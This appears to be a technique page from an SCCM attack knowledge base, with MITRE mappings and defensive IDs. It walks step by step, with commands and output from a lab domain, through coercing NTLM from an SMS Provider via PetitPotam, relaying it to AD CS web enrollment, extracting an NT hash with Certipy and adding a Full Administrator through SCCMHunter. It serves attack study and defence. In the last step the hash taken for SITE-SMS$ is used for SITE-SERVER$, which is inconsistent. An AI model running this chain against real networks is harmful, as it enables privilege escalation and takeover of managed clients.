# TAKEOVER-3.2

## Description
Coerce NTLM from SMS Provider and relay to HTTP on AD CS

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on the coercion target:
    - TAKEOVER-3.2: Coerce SMS Provider
- Connectivity from the coercion target to SMB (TCP/445) on the relay server (or WebClient enabled and connectivity via any port)
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
    - Domain computer account is not in `Protected Users`
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target

### Relay
- Either of the following AD CS services is in use:
    - Certificate Authority Web Enrollment
    - Certificate Enrollment Web Service
- Connectivity from the relay server to HTTPS (TCP/443) on the relay target hosting the AD CS service
- Extended protection for authentication is not required by the target AD CS service
- An enabled AD CS template that allows enrollment and supports authentication 
- Relay target settings:
    - `RestrictReceivingNTLMTraffic` = `0` or not present
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target

## Summary
When available, SCCM uses public key infrastructure (PKI) for authentication and authorization. While not required, administrators may choose to deploy Active Directory Certificate Services (AD CS) to support SCCM's [various certificate requirements](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-certificates) rather than use self-signed certificates. AD CS is home to its own [misconfigurations](https://posts.specterops.io/certified-pre-owned-d95910965cd2); particularly ESC8. In short, the [certificate enrollment web interface](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) is vulnerable to NTLM relaying. An attacker may coerce NTLM authentication from a coercion target and relay to the AD CS enrollment web service to enroll in and acquire a valid certificate template on behalf of the target. The template can then be used to escalate to "Full Administrator" in SCCM by impersonating the coerced target.

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [PREVENT-11: Disable and uninstall WebClient on site servers](../../../defense-techniques/PREVENT/PREVENT-11/prevent-11_description.md)
- [PREVENT-14: Require EPA on AD CS and site databases](../../../defense-techniques/PREVENT/PREVENT-14/prevent-14_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Examples
1. Identify the AD CS server to target:
    ```
    # certipy find -dc-ip <DC_FQDN> -ns <RESOLVER> -u <USERNAME> -p <PASSWORD> -debug
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [+] Trying to resolve 'DC.APERTURE.LOCAL' at '192.168.57.100'
    [+] Authenticating to LDAP server
    [+] Bound to ldaps://192.168.57.100:636 - ssl
    [+] Default path: DC=APERTURE,DC=LOCAL
    [+] Configuration path: CN=Configuration,DC=APERTURE,DC=LOCAL
    [*] Finding certificate templates
    [*] Found 34 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 11 enabled certificate templates
    [+] Trying to resolve 'ADCS.APERTURE.LOCAL' at '192.168.57.100'
    [*] Trying to get CA configuration for 'APERTURE-ADCS-CA' via CSRA
    [+] Trying to get DCOM connection for: 192.168.57.17
    [!] Got error while trying to get CA configuration for 'APERTURE-ADCS-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
    [*] Trying to get CA configuration for 'APERTURE-ADCS-CA' via RRP
    [+] Connected to remote registry at 'ADCS.APERTURE.LOCAL' (192.168.57.17)
    [*] Got CA configuration for 'APERTURE-ADCS-CA'
    [+] Resolved 'ADCS.APERTURE.LOCAL' from cache: 192.168.57.17
    [+] Connecting to 192.168.57.17:80
    [!] Failed to lookup user with SID 'S-1-5-21-4151786419-2923899860-3944193274-500'
    [*] Saved BloodHound data to '20240620163343_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
    [+] Adding Domain Computers to list of current user's SIDs
    [*] Saved text output to '20240620163343_Certipy.txt'
    [*] Saved JSON output to '20240620163343_Certipy.json'
    ```

2. Use `SCCMHunter` to profile SCCM infrastructure and identify the SMS Provider. Note: using the "-all" option to profile all domain computers is not recommended in production networks.

    ```
    # sccmhunter.py find -d <DOMAIN_FQDN> -dc-ip <DC_FQDN> -u <USERNAME> -p <PASSWORD> -all                                                                                          
    SCCMHunter v1.0.5 by @garrfoster                                                                                                     
    [17:53:24] INFO     [*] Checking for System Management Container.                                                                    
    [17:53:24] INFO     [+] Found System Management Container. Parsing DACL.                                                             
    [17:53:24] INFO     [+] Found 1 computers with Full Control ACE                                                                      
    [17:53:24] INFO     [*] Querying LDAP for published Sites and Management Points                                                      
    [17:53:24] INFO     [+] Found 1 Management Points in LDAP.                                                                           
    [17:53:24] INFO     [*] Searching LDAP for anything containing the strings 'SCCM' or 'MECM'                                          
    [17:53:24] INFO     [-] No results found.                                                                                            
    [17:53:24] INFO     [*] Querying LDAP for all computer objects                                                                       
    [17:53:24] INFO     [+] Found 11 computers in LDAP.
    ```
    ```
    sccmhunter.py smb -dc-ip <DC_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_FQDN> -debug                                                                                                                                                                                                                                                                                                      SCCMHunter v1.0.5 by @garrfoster                                                                                                                                                                                                          [17:36:09] INFO     Profiling 1 site servers.                                                                                                                                                                                                                                                                                                                                                                                                                                       [17:36:09] DEBUG    [+] Connected to smb://site-server.aperture.local:445                                                                                                                                                                                                                                                                                                                                                                                                           [17:36:09] INFO     [*] Searching site-server.aperture.local for PXEBoot variables files.                                                                                                                                                                                                                                                                                                                                                                                           [17:36:09] DEBUG    [-] [Errno 111] Connection refused                                                                                                                                                                                                                                                                                                                                                                                                                              [17:36:09] INFO     [+] Finished profiling Site Servers.                                                                                                                                                                                                                                                                                                                                                                                                                            [17:36:09] INFO     
    +----------------------------+------------+-------+-----------------+--------------+---------------+----------+---------+                                                                                                                                                                                                                                                                                                                                                           | Hostname                   | SiteCode   | CAS   | SigningStatus   | SiteServer   | SMSProvider   | Config   | MSSQL   |                                                                                                                                                                                                                                                                                                                                                           +============================+============+=======+=================+==============+===============+==========+=========+                                                                                                                                                                                                                                                                                                                                                           | site-server.aperture.local | PS1        | False | False           | True         | True          | Active   | False   |                                                                                                                                                                                                                                                                                                                                                           +----------------------------+------------+-------+-----------------+--------------+---------------+----------+---------+
    [17:36:09] INFO     Profiling 1 management points.
    [17:36:09] DEBUG    [+] Connected to smb://site-server.aperture.local:445
    [17:36:09] INFO     [*] Searching site-server.aperture.local for PXEBoot variables files.
    [17:36:09] INFO     [+] Finished profiling Management Points.
    [17:36:09] INFO     
    +----------------------------+------------+-----------------+
    | Hostname                   | SiteCode   | SigningStatus   |
    +============================+============+=================+
    | site-server.aperture.local | PS1        | False           |
    +----------------------------+------------+-----------------+
    [17:36:09] INFO     Profiling 11 computers.
    [17:36:09] DEBUG    [+] Connected to smb://adcs.aperture.local:445
    [17:36:09] DEBUG    [-] [Errno 111] Connection refused
    [17:36:09] DEBUG    [+] Connected to smb://site-sms.aperture.local:445
    [17:36:09] DEBUG    [-] [Errno 111] Connection refused
    [17:36:19] DEBUG    [-] Error connecting to smb://site-dp.aperture.local:445
    [17:36:22] DEBUG    [-] Error connecting to smb://hybridjoin-intu.aperture.local:445
    [17:36:25] DEBUG    [-] Error connecting to smb://adjoinintuneenroll.aperture.local:445
    [17:36:28] DEBUG    [-] Error connecting to smb://vs-01.aperture.local:445
    [17:36:32] DEBUG    [-] Error connecting to smb://client-1.aperture.local:445
    [17:36:35] DEBUG    [-] Error connecting to smb://client.aperture.local:445
    [17:36:35] DEBUG    [+] Connected to smb://site-server.aperture.local:445
    [17:36:35] DEBUG    [-] [Errno 111] Connection refused
    [17:36:35] INFO     [*] Searching site-server.aperture.local for PXEBoot variables files.
    [17:36:35] DEBUG    [+] Connected to smb://site-db.aperture.local:445
    [17:36:35] DEBUG    HTTPConnectionPool(host='site-db.aperture.local', port=80): Max retries exceeded with url: /SMS_MP (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f75d5280c40>: Failed to establish a new connection: [Errno 111] Connection refused'))
    [17:36:35] DEBUG    HTTPSConnectionPool(host='site-db.aperture.local', port=443): Max retries exceeded with url: /adminservice/wmi/ (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f75d5280b50>: Failed to establish a new connection: [Errno 111] Connection refused'))
    [17:36:35] DEBUG    [+] Connected to smb://dc.aperture.local:445
    [17:36:40] DEBUG    [-] timed out
    [17:38:50] DEBUG    HTTPConnectionPool(host='dc.aperture.local', port=80): Max retries exceeded with url: /SMS_MP (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f75d5280f70>, 'Connection to dc.aperture.local timed out. (connect timeout=None)'))
    [17:41:01] DEBUG    HTTPSConnectionPool(host='dc.aperture.local', port=443): Max retries exceeded with url: /adminservice/wmi/ (Caused by ConnectTimeoutError(<urllib3.connection.HTTPSConnection object at 0x7f75d5283d60>, 'Connection to dc.aperture.local timed out. (connect timeout=None)'))
    [17:41:01] INFO     [+] Finished profiling all discovered computers.
    [17:41:01] INFO     
    +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | Hostname                          | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |                                                                                                              +===================================+============+=================+==============+===================+=====================+===============+========+=========+                                                                                                              | adcs.aperture.local               | None       | False           | False        | False             | False               | False         | False  | False   |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | site-sms.aperture.local           | None       | False           | False        | False             | False               | True          | False  | False   |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | site-dp.aperture.local            |            |                 |              |                   |                     |               |        |         |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | hybridjoin-intu.aperture.local    |            |                 |              |                   |                     |               |        |         |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | adjoinintuneenroll.aperture.local |            |                 |              |                   |                     |               |        |         |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | vs-01.aperture.local              |            |                 |              |                   |                     |               |        |         |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | client-1.aperture.local           |            |                 |              |                   |                     |               |        |         |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | client.aperture.local             |            |                 |              |                   |                     |               |        |         |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | site-server.aperture.local        | PS1        | False           | True         | True              | False               | True          | False  | False   |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | site-db.aperture.local            | None       | False           | False        | False             | False               | False         | False  | True    |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                                                              | dc.aperture.local                 | None       | True            | False        | False             | False               | False         | False  | False   |                                                                                                              +-----------------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
    ```

3. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the certificate enrollment web interface on the certificate authority:

    ```
    # python3 ntlmrelayx.py -t http://adcs.aperture.local/certsrv/certfnsh.asp --adcs -smb2support                                                   
    Impacket v0.12.0.dev1+20240502.235035.cb8467c3 - Copyright 2023 Fortra                                                                                                                                                                                                                                                                                                                                
    [*] Protocol Client HTTP loaded..                                                                                                                                                                  
    [*] Protocol Client HTTPS loaded..                                                                                                                                                                 
    [*] Protocol Client RPC loaded..                                                                                                                                                                   
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client SMB loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Running in relay mode to single host
    [*] Setting up SMB Server
    [*] Setting up HTTP Server on port 80
    [*] Setting up WCF Server

    [*] Setting up RAW Server on port 6666
    [*] Servers started, waiting for connections
    ```

4. From the attacker host, coerce NTLM authentication from the SMS Provider via SMB, targeting the relay server's IP address:

    ```
    └─# python3 PetitPotam.py -u <USERNAME> -p <PASSWORD> <NTLMRELAYX_LISTENER_IP> <SMS_PROVIDER_IP> 

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:192.168.57.15[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the cert enrollment service to request a certificate for the coercion target:

    ```
    [*] SMBD-Thread-5: Received connection from 192.168.57.15, attacking target http://adcs.aperture.local
    [*] HTTP server returned error code 200, treating as a successful login
    [*] Authenticating against http://adcs.aperture.local as APERTURE/SITE-SMS$ SUCCEED
    [*] SMBD-Thread-7: Received connection from 192.168.57.15, attacking target http://adcs.aperture.local
    [*] HTTP server returned error code 200, treating as a successful login
    [*] Authenticating against http://adcs.aperture.local as APERTURE/SITE-SMS$ SUCCEED
    [*] Generating CSR...
    [*] CSR generated!
    [*] Getting certificate...
    [*] GOT CERTIFICATE! ID 5
    [*] Writing certificate to ./SITE-SMS$.pfx
    [*] Certificate successfully written to file
    ```

5. Use `certipy` to recover the coerced target's NT hash:

    ```
    certipy auth -pfx SITE-SMS\$.pfx
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Using principal: site-sms$@aperture.local
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'site-sms.ccache'
    [*] Trying to retrieve NT hash for 'site-sms$'
    [*] Got hash for 'site-sms$@aperture.local': aad3b435b51404eeaad3b435b51404ee:0bce...0314
    ```

6. Use `SCCMHunter` to authenticate to an SMS Provider as the site server and grant a user the Full Administrator role:

```
# python3 sccmhunter.py admin -u SITE-SERVER\$ -p aad3b435b51404eeaad3b435b51404ee:0bce...0314 -ip SITE-SERVER.APERTURE.LOCAL
SCCMHunter v1.0.3 by @garrfoster
[16:27:23] INFO     [!] Enter help for extra shell commands
() C:\ >> show_admins
[16:27:28] INFO     Tasked SCCM to list current SMS Admins.
[16:27:29] INFO     Current Full Admin Users:
[16:27:29] INFO     SITE-SERVER\labadmin
[16:27:29] INFO     APERTURE\labadmin
() (C:\) >> get_user lowpriv
[16:27:47] INFO     [*] Collecting users...
[16:27:47] INFO     [+] User found.
[16:27:47] INFO     ------------------------------------------
                    DistinguishedName: CN=Low Priv,CN=Users,DC=APERTURE,DC=LOCAL
                    FullDomainName: APERTURE.LOCAL
                    FullUserName: Low Priv
                    Mail:
                    NetworkOperatingSystem: Windows NT
                    ResourceId: 2063597573
                    sid: S-1-5-21-1642199630-664550351-1777980924-34102
                    UniqueUserName: APERTURE\lowpriv
                    UserAccountControl: 66048
                    UserName: lowpriv
                    UserPrincipalName: lowpriv@APERTURE.LOCAL
                    ------------------------------------------
() (C:\) >> add_admin lowpriv S-1-5-21-1642199630-664550351-1777980924-34102
[16:28:01] INFO     Tasked SCCM to add lowpriv as an administrative user.
[16:28:02] INFO     [+] Successfully added lowpriv as an admin.
() (C:\) >> show_admins
[16:28:06] INFO     Tasked SCCM to list current SMS Admins.
[16:28:06] INFO     Current Full Admin Users:
[16:28:06] INFO     SITE-SERVER\labadmin
[16:28:06] INFO     APERTURE\labadmin
[16:28:06] INFO     lowpriv
```

## References
- Will Schroeder and Lee Chagolla-Christensen, [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- Oliver Lyak, [Certipy](https://github.com/ly4k/Certipy)
- Microsoft, [Plan for PKI certificates in Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-certificates)
